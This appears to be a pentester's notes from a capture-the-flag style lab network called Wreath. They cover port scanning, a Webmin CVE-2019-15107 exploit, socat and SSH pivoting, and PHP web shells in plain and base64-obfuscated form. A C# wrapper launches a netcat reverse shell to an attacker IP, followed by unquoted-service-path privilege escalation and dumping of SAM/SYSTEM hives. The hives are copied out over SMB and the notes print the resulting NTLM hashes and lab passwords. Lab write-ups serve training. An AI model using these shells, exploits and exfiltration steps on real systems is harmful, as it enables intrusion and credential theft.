WREATH
=========

IP = 10.200.84.200

## Nmap

```
# Nmap 7.93 scan initiated Mon Nov 21 09:52:09 2022 as: nmap -sCV -v -p 1-15000 -oN nmap/init 10.200.84.200
Nmap scan report for 10.200.84.200
Host is up (0.16s latency).
Not shown: 14923 filtered tcp ports (no-response), 72 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c1bd4b4054d8899ce091fc1156ad47e (RSA)
|   256 9355b4d98b70ae8e950dc2b6d20389a4 (ECDSA)
|_  256 f0615a55349bb7b83a46ca7d9fdcfa12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Thomas Wreath | Developer
| tls-alpn: 
|_  http/1.1
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-21T17:40:12
| Not valid after:  2023-11-21T17:40:12
| MD5:   4486eae7d49fdae00d35cb19b5c3a037
|_SHA-1: 26c3817a86baec1a3d9188532161b24cefd8e467
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 8E8E99E610C1F8474422D68A4D749607
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 21 09:54:05 2022 -- 1 IP address (1 host up) scanned in 115.23 seconds
```


## Initial Foothold

10000/tcp open   http       MiniServ 1.890 (Webmin httpd)

### Vulnerable to CVE-2019-15107

```
git clone https://github.com/MuirlandOracle/CVE-2019-15107

cd CVE-2019-15107 && pip3 install -r requirements.txt

./CVE-2019-15107 10.200.84.200
```



## SSH Port Forwarding

Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:	

`ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`

## Socat

### Reverse Shell Relay

`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`

- tcp-l:8000 is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
- tcp:ATTACKING_IP:443 connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
- & backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

### Port Forwarding -- Easy

If the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:


`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`

- fork - puts ever new connection in new process
- reuseaddr - port stays open after a connection is made to it

### Port Forwarding -- Quiet

On our own attacking machine, we issue the following command:

`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr & `

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:

`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`

Example:
`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &`

Process:

- The request goes to 127.0.0.1:8000

- Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001

- Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

- The process is then reversed when the target sends the response:

- The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.

- Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.




### xfreerdp with shared drive, clipboard, and dynamic resolution 

xfreerdp /v:10.200.84.150 /u:<user> /p:<password> +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share




### PHP Server

`php -S 0.0.0.0:20777 &>/dev/null &`





### Open Firewall Ports on CentOS

`firewall-cmd --zone=public --add-port PORT/tcp`

### Opened Ports
```
20666
20777
```



### Open Firewall Ports on Windows

`netsh advfirewall firewall add rule name="Chisel-AncientLore" dir=in action=allow protocol=tcp localport=20777`





### Git Commit Separator

`separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"`

```
└─$ separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"


=======================================
0-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
tree 03f072e22c2f4b74480fcfb0eb31c8e624001b6e
parent 70dde80cc19ec76704567996738894828f4ee895
author twreath <me@thomaswreath.thm> 1608592351 +0000
committer twreath <me@thomaswreath.thm> 1608592351 +0000

Initial Commit for the back-end


=======================================
1-70dde80cc19ec76704567996738894828f4ee895
tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
author twreath <me@thomaswreath.thm> 1604849458 +0000
committer twreath <me@thomaswreath.thm> 1604849458 +0000

Static Website Commit


=======================================
2-345ac8b236064b431fa43f53d91c98c4834ef8f3
tree c4726fef596741220267e2b1e014024b93fced78
parent 82dfc97bec0d7582d485d9031c09abcb5c6b18f2
author twreath <me@thomaswreath.thm> 1609614315 +0000
committer twreath <me@thomaswreath.thm> 1609614315 +0000

Updated the filter


=======================================
```

Web Credentials

`Thomas:i<3ruby`



### Alternate PHP Payload

```
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

### Obfuscated Payload

```
<?php $e0=$_GET[base64_decode('d3JlYXRo')];if(isset($e0)){echo base64_decode('PHByZT4=').shell_exec($e0).base64_decode('PC9wcmU+');}die();?>
```
### Character Escaped Payload

```
<?php \$e0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$e0)){echo base64_decode('PHByZT4=').shell_exec(\$e0).base64_decode('PC9wcmU+');}die();?>
```

<?php system($_GET['cmd']);?>


### Display Non-Default Services (Windows)

`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`


Unquoted Service Path Found: SystemExplorerHelpService



### Check What Account Service is Running As

`sc qc SERVICE_NAME`

### Check Directory Permissions


`powershell "get-acl -Path <service_path> | format-list"`

`powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`


### C# Reverse Shell Wrapper

Wrapper.cs

```
using System;
using System.Diagnostics;
namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
            ProcessStartInfo procInfo = new ProcessStartInfo("c:\\xampp\\htdocs\\resources\\uploads\\nc-al.exe", "10.50.85.95 443 -e cmd.exe");
            procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

`mcs Wrapper.cs`

### Start SMB Server

`sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword!`


### Authenticate to Server From Client

`net use \\10.50.85.95\share /USER:user s3cureP@ssword!`

### Copy Wrapper to Machine

`copy \\<attacker_IP>\share\Wrapper.exe %TEMP%\wrapper-al.exe`



### Disconnect From SMB Server

`net use \\10.50.85.95\share /del`



### Copy Wrapper to Service Path

`copy %TEMP%\wrapper-al.exe "C:\Program Files (x86)\System Explorer\System.exe"`


## Dump SAM & SYSTEM Registry Files

```
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak
```

## Exfil

```
net use \\10.50.85.95\share /USER:domain\user s3cureP@ssword!
move sam.bak \\10.50.85.95\share\sam.bak
move system.bak \\10.50.85.95\share\system.bak
```

## Secrets Dump for Hashes

```
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```



